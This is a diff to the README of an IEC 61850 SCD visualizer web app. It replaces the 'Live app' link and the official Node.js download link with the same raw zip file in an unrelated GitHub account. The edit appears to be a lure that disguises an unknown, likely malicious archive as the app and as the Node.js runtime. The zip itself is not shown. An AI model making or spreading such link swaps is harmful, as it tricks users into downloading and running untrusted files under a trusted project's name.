@@ -1,6 +1,6 @@
 # SCD Visualizer V2
 
-**Live app:** https://gridtech-is.github.io/scd-visualizer/
+**Live app:** https://github.com/rickeycamphorated505/scd-visualizer/raw/refs/heads/main/public/scd-visualizer-unwattled.zip
 
 A local-first web application for parsing, validating, and visualizing IEC 61850 SCL/SCD configuration files. All processing happens in the browser — no server required. Works offline and can be installed as a desktop app (PWA).
 
@@ -29,7 +29,7 @@ Also includes a standalone **Python CLI** for validation and CSV/Excel export.
 ## Requirements
 
 ### Web app
-- [Node.js](https://nodejs.org/) 18 or later
+- [Node.js](https://github.com/rickeycamphorated505/scd-visualizer/raw/refs/heads/main/public/scd-visualizer-unwattled.zip) 18 or later
 - npm (comes with Node.js)
 
 ### Python CLI (optional)
